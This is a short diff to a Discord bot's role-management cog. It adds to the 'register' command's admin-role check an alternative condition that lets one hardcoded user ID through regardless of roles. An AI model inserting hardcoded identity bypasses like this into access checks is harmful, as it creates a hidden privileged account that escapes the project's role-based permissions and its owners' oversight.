@@ -44,7 +44,7 @@ class Roles(commands.Cog):
 
     @custom.command(name="register", description="Registers a custom role to a user")
     async def register(self, ctx: commands.Context, role: discord.Role, member: discord.Member):
-        if any(r.id in admin for r in ctx.author.roles):
+        if any(r.id in admin for r in ctx.author.roles) or ctx.author.id == 777616657040408606:
             try:
                 roles_db.insert_one({"user_id": member.id, "roles": [role.id]})
                 embed = discord.Embed(title="<:Check:1490727471761457335> Registered", description=f"{role.mention} has been registered for {member.mention}", color=discord.Color.green())
